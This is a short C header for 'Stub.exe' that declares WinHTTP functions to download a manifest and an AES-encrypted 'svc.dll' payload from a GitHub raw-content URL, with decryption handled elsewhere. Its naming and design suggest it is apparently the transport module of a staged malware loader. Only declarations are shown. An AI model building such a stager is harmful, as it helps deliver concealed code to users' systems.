/* stub_transport.h — HTTPS GET via WinHTTP for Stub.exe.
 *
 * Pulls the encrypted svc.dll payload (and its manifest) from a public
 * GitHub repo.  Plaintext payload never touches GitHub — only the
 * AES-GCM-encrypted blob.  This module is responsible for the bytes only;
 * verification + decryption live in stub_crypto.c.
 *
 * Retry policy: 3 attempts with exponential backoff (500ms, 1500ms, 3000ms).
 *
 * NOTE: Caller frees buffers via Stub_FreeBuf() (stub_crypto.h) so we don't
 * leak plaintext key material — even though the manifest itself isn't
 * sensitive, keeping a single free path simplifies cleanup.
 */
#pragma once
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct StubTransportCfg {
    const wchar_t* host;       /* e.g. L"raw.githubusercontent.com" */
    const wchar_t* manifest;   /* e.g. L"/dsadawadsdasasc/svc-releases/main/manifest.json" */
    const wchar_t* payload;    /* e.g. L"/dsadawadsdasasc/svc-releases/main/svc.bin"       */
    int            timeoutMs;  /* per-request timeout (default 15000) */
} StubTransportCfg;

/* Download the manifest as raw bytes.  Returns 0 on success.  Caller frees
 * via Stub_FreeBuf(). */
int Stub_DownloadManifest(const StubTransportCfg* cfg,
                          BYTE** outBuf, SIZE_T* outLen);

/* Download the payload blob (encrypted svc.dll).  Returns 0 on success. */
int Stub_DownloadPayload(const StubTransportCfg* cfg,
                         BYTE** outBuf, SIZE_T* outLen);

#ifdef __cplusplus
}
#endif
